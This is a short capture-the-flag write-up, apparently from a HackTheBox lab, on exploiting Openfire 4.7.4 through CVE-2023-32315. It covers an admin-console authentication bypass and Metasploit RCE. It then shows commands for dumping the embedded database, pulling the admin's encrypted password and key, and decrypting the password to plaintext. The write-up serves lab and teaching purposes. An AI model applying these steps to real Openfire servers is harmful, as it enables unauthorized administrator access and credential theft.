**Openfire Exploitation**
In one CTF I found a way on how to PE via Openfire, specifically version 4.7.4 via this CVE: https://github.com/miko550/CVE-2023-32315

1)First option:
Using the payload from before allows you to bypass the login admin console(on port 9090) and add a used ad administrator.
2)Second option
Use the payload available in Metasploit to gain rce to the machine

### Taking in further...
If you get a RCE via option nr.2 then you will gain access(probably) to the installation folder of Openfire, from there you can read the db of the app and ex-filtrate the admin password from the specific folder (embedded-db).
```
C:\Program Files\Openfire\embedded-db>type openfire.script
```
From the file you need the password hash(the long ass hash):
```
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
```
And the password key used to hash:
```
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
```
Lastly use this java to decrypt:
https://github.com/c0rdis/openfire_decrypt?tab=readme-ov-file
```
java OpenFireDecryptPass.java "becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442" "hGXiFzsKaAeYLjn"             
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
```